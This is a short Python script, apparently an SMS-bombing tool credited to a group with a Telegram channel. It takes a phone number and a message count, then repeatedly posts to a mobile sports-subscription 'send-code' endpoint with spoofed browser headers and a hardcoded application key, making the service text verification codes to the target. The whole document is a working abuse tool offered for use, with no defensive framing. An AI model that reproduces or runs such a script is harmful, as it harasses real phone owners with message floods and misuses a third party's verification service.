# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @psh_team )
import requests
a = 0
try:
	num = input('\033[1;32mEnter Phone Number \033[1;34m:\033[1;39m ')
	count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
except:
	print()
	print('\033[1;31mwrong entry')
	exit('\033[1;39m')
print()
plus = '+'
op = 0
while op<count:
    hd = {
    "Host": "appcorp.mobi:8089",
"Connection": "keep-alive",
"Content-Length": "4",
"Accept": "application/json, text/plain, */*",
"application_key": "5652649d-5a19-4ccd-81a2-530827d9cd6b",
"Accept-Language": "ar",
"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-T585) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Content-Type": "application/json",
"Origin": "http://etisalatsports.com",
"Referer": "http://etisalatsports.com/",
"Accept-Encoding": "gzip, deflate"
  }
  
    url = 'http://appcorp.mobi:8089/elmal3ab/subscription/send-code?msisdn=2'+num



    r = requests.post(url, headers=hd).text
    print(r)
    op = op + 1
    if '200' in r:
    	print(f'\x1b[1;99m• \x1b[1;92mDone Send Sms {op}')
    else:
    		print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
    		print('\033[1;39m')
    		exit()

print('\033[1;39m')
                            
